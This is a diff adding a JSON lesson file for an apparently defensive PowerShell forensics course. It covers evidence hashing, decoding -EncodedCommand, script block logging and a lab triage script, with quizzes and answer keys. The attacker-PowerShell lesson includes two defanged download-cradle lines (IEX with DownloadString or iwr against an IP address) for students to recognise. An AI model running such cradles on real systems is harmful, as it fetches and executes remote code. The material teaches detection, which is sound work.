+     "code": "PS> [pscustomobject]@{User='kane'} |\n      Export-Csv C:\\Evidence\\u.csv\nPS> Get-Content C:\\Evidence\\u.csv -TotalCount 1",
+     "o": [
+      "\"User\", the header",
+      "\"kane\", the data",
+      "A #TYPE line"
+     ],
+     "k": 2,
+     "w": "A #TYPE line naming the object type, because 5.1 adds it without -NoTypeInformation. Not \"User\": the header comes second. Not \"kane\": the data comes after the header."
+    },
+    {
+     "d": 1,
+     "q": "Why record evidence times in UTC?",
+     "o": [
+      "Local time can't record seconds",
+      "Times from different systems line up",
+      "UTC is easier for people to read"
+     ],
+     "k": 1,
+     "w": "Times from different systems line up, even across time zones and daylight saving. Not seconds: local time is just as precise. Not readability: most people find local time easier to read."
+    },
+    {
+     "d": 1,
+     "q": "Why record a file's SHA-256 hash when you collect it?",
+     "o": [
+      "To prove later it hasn't changed",
+      "To make the file smaller",
+      "To encrypt the file"
+     ],
+     "k": 0,
+     "w": "To prove later it hasn't changed. The same file always gives the same hash. Not smaller or encrypted: a hash doesn't change the file at all."
+    }
+   ],
+   "challenge": {
+    "think": true,
+    "p": "Fix the command for Windows PowerShell 5.1. A colleague's tool can't read the file: `Get-Process | Export-Csv C:\\Evidence\\procs.csv`",
+    "hint": "What extra line does 5.1 add at the top?",
+    "solution": "`Get-Process | Export-Csv C:\\Evidence\\procs.csv -NoTypeInformation`. Without it, the first line is a #TYPE line that many tools can't read. Then hash the file with Get-FileHash."
+   },
+   "tryit": {
+    "h": "Collect and hash",
+    "where": "Windows VM",
+    "p": "Export your running processes, note the UTC time and hash the file. Change one character in the file, then hash it again and compare.",
+    "code": "New-Item -ItemType Directory C:\\Evidence -Force | Out-Null\nGet-Process | Select-Object Id, Name, Path |\n  Export-Csv C:\\Evidence\\processes.csv -NoTypeInformation\n(Get-Date).ToUniversalTime().ToString('o')\nGet-FileHash C:\\Evidence\\processes.csv",
+    "warn": "Take a snapshot of your VM first. Lab only: never run these on a work or personal computer."
+   },
+   "recap": [
+    "Use Export-Csv -NoTypeInformation in 5.1.",
+    "Set ConvertTo-Json -Depth for nested data.",
+    "Record timestamps in UTC.",
+    "Hash evidence files with Get-FileHash."
+   ]
+  },
+  {
+   "t": "Reading attacker PowerShell",
+   "sub": "Recognise it, decode it, never build it.",
+   "lang": "ps",
+   "learn": [
+    [
+     "Key terms",
+     "-EncodedCommand: a PowerShell option that takes a command as Base64 text.\nDownload cradle: a short command that downloads code and runs it straight away.\nScript block logging: a Windows setting that records the PowerShell code that runs."
+    ],
+    [
+     "Encoded commands",
+     "-EncodedCommand, often shortened to -enc, takes Base64 of UTF-16LE text, the way Windows stores text. Attackers use it to hide commands from casual reading. Decoding it shows the real command."
+    ],
+    [
+     "Decode it yourself",
+     "You can decode it in Python. Base64 turns into bytes, and UTF-16LE turns the bytes into text. This lesson's editor runs real Python, so try it there. Terminal Lesson 15 covers Base64."
+    ],
+    [
+     "Download cradles",
+     "These download and run code in one line. Recognise the pattern: a download method such as DownloadString or Invoke-WebRequest, passed into IEX, short for Invoke-Expression. Flags like -w hidden and -nop often come with it.",
+     "# Recognise only. Address defanged.\nIEX (New-Object Net.WebClient).DownloadString('hxxp://198.51.100.23/a')"
+    ],
+    [
+     "Logging that catches it",
+     "Script block logging writes Event ID 4104 to the Microsoft-Windows-PowerShell/Operational log. It records the decoded code that actually ran. Module logging writes Event ID 4103. Turn both on through Group Policy."
+    ],
+    [
+     "Execution policy isn't security",
+     "Microsoft says execution policy isn't a security boundary. It stops accidental script runs, but anyone can bypass it, for example with -ExecutionPolicy Bypass. Don't count on it to stop attackers."
+    ]
+   ],
+   "play": {
+    "p": "Decode this encoded PowerShell command with Python. Then change the decoding to \"utf-8\" to see why UTF-16LE matters.",
+    "code": "import base64\nblob = \"RwBlAHQALQBEAGEAdABlAA==\"\nprint(base64.b64decode(blob).decode(\"utf-16-le\"))"
+   },
+   "quiz": [
+    {
+     "d": 1,
+     "q": "What is the text after -EncodedCommand?",
+     "o": [
+      "Encrypted with a secret key",
+      "Compressed with ZIP",
+      "Base64 of UTF-16LE text"
+     ],
+     "k": 2,
+     "w": "Base64 of UTF-16LE text, so anyone can decode it with no key. Not encrypted: Base64 is encoding, not encryption. Not ZIP: it isn't compressed."
+    },
+    {
+     "d": 2,
+     "q": "In these sample Event ID 4104 entries, which one is a download cradle?",
+     "code": "1: Get-ChildItem C:\\Reports -Filter *.pdf\n2: IEX (iwr 'hxxp://198.51.100.23/p.ps1' -UseBasicParsing).Content\n3: Get-Service Spooler | Restart-Service",
+     "o": [
+      "Line 1",
+      "Line 2",
+      "Line 3"
+     ],
+     "k": 1,
+     "w": "Line 2 downloads a script with iwr (Invoke-WebRequest) and runs it with IEX. Not line 1: it lists PDF files. Not line 3: it restarts the print service."
+    },
+    {
+     "d": 2,
+     "q": "A policy sets the execution policy to Restricted. Does that stop an attacker running PowerShell code?",
+     "o": [
+      "Yes, Restricted blocks all PowerShell",
+      "No, it isn't a security boundary",
+      "Yes, but only for encoded commands"
+     ],
+     "k": 1,
+     "w": "No, it isn't a security boundary. Commands can still be typed or passed with -ExecutionPolicy Bypass. Not blocking all PowerShell: Restricted only stops script files. Not encoded commands: they aren't script files either."
+    }
+   ],
+   "challenge": {
+    "p": "Fix the decoder so it prints the hidden command, whoami. It uses the wrong text encoding.",
+    "start": "import base64\nblob = \"dwBoAG8AYQBtAGkA\"\nprint(base64.b64decode(blob).decode(\"utf-8\"))",
+    "expect": "whoami",
+    "hint": "PowerShell encodes commands as UTF-16LE text before Base64.",
+    "solution": "import base64\nblob = \"dwBoAG8AYQBtAGkA\"\nprint(base64.b64decode(blob).decode(\"utf-16-le\"))"
+   },
+   "tryit": {
+    "h": "Catch your own encoded command",
+    "where": "Windows VM, elevated PowerShell",
+    "p": "Turn on script block logging in gpedit.msc (Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell). Run a harmless encoded command, then find its 4104 event.",
+    "code": "$b = [Convert]::ToBase64String(\n  [Text.Encoding]::Unicode.GetBytes('Get-Date'))\npowershell -EncodedCommand $b\nGet-WinEvent -FilterHashtable @{\n  LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} -MaxEvents 5 |\n  Select-Object TimeCreated, Message",
+    "warn": "Take a snapshot of your VM first. Lab only: never run these on a work or personal computer."
+   },
+   "recap": [
+    "-EncodedCommand is Base64 of UTF-16LE text.",
+    "Decode it to see the real command.",
+    "IEX plus a download is a download cradle.",
+    "4104 logs the code that ran. Execution policy isn't a security boundary."
+   ]
+  },
+  {
+   "t": "Capstone: a lab triage report",
+   "sub": "One script, one CSV, four checks.",
+   "lang": "ps",
+   "learn": [
+    [
+     "Key terms",
+     "Triage: a quick first look to decide what needs attention.\nArray subexpression: @( ), which gathers the output of several commands into one list.\nCalculated property: a column you build yourself from other values."
+    ],
+    [
+     "What the script does",
+     "The capstone script collects four things into one CSV: failed logons, local administrators, new services and non-Microsoft scheduled tasks. Each row says which check found it."
+    ],
+    [
+     "One shape for every row",
+     "Every check outputs the same three columns: Check, TimeUtc and Detail. That keeps the CSV easy to sort and filter, whatever found the row."
+    ],
+    [
+     "Gathering it all",
+     "@( ) runs each command in turn and collects everything they output into one list. A check that finds nothing simply adds nothing."
+    ],
+    [
+     "Finish with a hash",
+     "The script ends by hashing the CSV with Get-FileHash. Write the hash in your notes, so you can show later that the report hasn't changed."
+    ]
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "q": "Why does the script add -ErrorAction SilentlyContinue to Get-WinEvent?",
+     "o": [
+      "To make the query faster",
+      "To skip events it can't read",
+      "To hide the no-match error"
+     ],
+     "k": 2,
+     "w": "To hide the no-match error. Get-WinEvent reports \"No events were found\" as an error. Not speed: it doesn't change the query. Not unreadable events: it's about having no matches."
+    },
+    {
+     "d": 1,
+     "q": "Why does every check output Check, TimeUtc and Detail?",
+     "o": [
+      "So all rows fit one CSV layout",
+      "So the file is encrypted",
+      "So PowerShell runs faster"
+     ],
+     "k": 0,
+     "w": "So all rows fit one CSV layout that's easy to sort and filter. Not encryption: CSV is plain text. Not speed: column names don't affect speed."
+    },
+    {
+     "d": 2,
+     "q": "The report lists a scheduled task called \\UpdateCheck. What should you do next?",
+     "o": [
+      "Delete it straight away",
+      "Look at what its action runs",
+      "Ignore it: tasks are normal"
+     ],
+     "k": 1,
+     "w": "Look at what its action runs, with (Get-ScheduledTask -TaskName UpdateCheck).Actions. Not deleting straight away: you'd destroy evidence and might break something legitimate. Not ignoring it: attackers use tasks for persistence."
+    }
+   ],
+   "challenge": {
+    "think": true,
+    "p": "Extend the script with a fifth check: programs in the machine-wide Run key, as rows with Check set to 'Run key'. Write the extra lines.",
+    "hint": "Get-ItemProperty returns one object with a property per entry. Get-Item gives you the entry names.",
+    "solution": "Add inside @( ): `$k = Get-Item HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run; $k.GetValueNames() | ForEach-Object { [pscustomobject]@{Check='Run key'; TimeUtc=''; Detail=\"$_ = $($k.GetValue($_))\"} }`"
+   },
+   "tryit": {
+    "h": "Run the triage report",
+    "where": "Windows VM, elevated PowerShell",
+    "p": "Save this as triage.ps1 and run it. Open the CSV, then write down the hash it prints.",
+    "code": "# Lab triage report. Run as administrator.\n$since = (Get-Date).AddDays(-1)\n$rows = @(\n  Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625; StartTime=$since} -ErrorAction SilentlyContinue |\n    ForEach-Object { [pscustomobject]@{Check='Failed logon'; TimeUtc=$_.TimeCreated.ToUniversalTime().ToString('o'); Detail=\"$($_.Properties[5].Value) from $($_.Properties[19].Value)\"} }\n  Get-LocalGroupMember -Group Administrators |\n    ForEach-Object { [pscustomobject]@{Check='Local admin'; TimeUtc=''; Detail=$_.Name} }\n  Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045; StartTime=$since} -ErrorAction SilentlyContinue |\n    ForEach-Object { [pscustomobject]@{Check='New service'; TimeUtc=$_.TimeCreated.ToUniversalTime().ToString('o'); Detail=\"$($_.Properties[0].Value): $($_.Properties[1].Value)\"} }\n  Get-ScheduledTask | Where-Object TaskPath -notlike '\\Microsoft\\*' |\n    ForEach-Object { [pscustomobject]@{Check='Scheduled task'; TimeUtc=''; Detail=\"$($_.TaskPath)$($_.TaskName)\"} }\n)\nNew-Item -ItemType Directory C:\\Evidence -Force | Out-Null\n$out = \"C:\\Evidence\\triage-$(Get-Date -Format yyyyMMdd-HHmm).csv\"\n$rows | Export-Csv $out -NoTypeInformation\nGet-FileHash $out -Algorithm SHA256",
+    "warn": "Take a snapshot of your VM first. Lab only: never run these on a work or personal computer."
+   },
+   "recap": [
+    "One script can run several checks into one report.",
+    "Give every row the same columns.",
+    "@( ) gathers output from several commands.",
+    "Hash the report so you can prove it hasn't changed."
+   ]
+  }
+ ],
+ "migrate": {
+  "note": "Saved answers from the 14-lesson track (before 2026-11-17), mapped to the 24-lesson track.",
+  "quiz": {
+   "1.0": "1.0",
+   "1.1": "1.2",
+   "1.2": "3.1",
+   "2.0": "2.0",
+   "2.1": "2.1",
+   "2.2": "1.1",
+   "3.0": "8.0",
+   "3.1": "8.1",
+   "3.2": "2.2",
+   "4.0": "4.0",
+   "4.1": "5.0",
+   "4.2": "5.1",
+   "5.0": "6.0",
+   "5.1": "11.0",
+   "5.2": "6.1",
+   "6.0": "3.0",
+   "6.1": "7.0",
+   "6.2": "7.1",
+   "7.0": "9.0",
+   "7.1": "23.4",
+   "7.2": "9.1",
+   "8.0": "12.0",
+   "8.1": "12.1",
+   "8.2": "12.2",
+   "9.0": "14.0",
+   "9.1": "15.0",
+   "9.2": "14.1",
+   "10.0": "23.0",
+   "10.1": "23.1",
+   "11.0": "18.0",
+   "11.1": "17.0",
+   "11.2": "18.1",
+   "12.0": "16.0",
+   "12.1": "16.1",
+   "13.0": "23.2",
+   "13.1": "23.3",
+   "14.0": "24.0",
+   "14.1": "24.1",
+   "14.2": "24.2"
+  },
+  "lessons": {
+   "1": 1,
+   "2": 2,
+   "3": 8,
+   "4": 5,
+   "5": 6,
+   "6": 3,
+   "7": 9,
+   "8": 12,
+   "9": 14,
+   "10": 23,
+   "11": 17,
+   "12": 16,
+   "13": 23,
+   "14": 24
+  }
+ }
+}
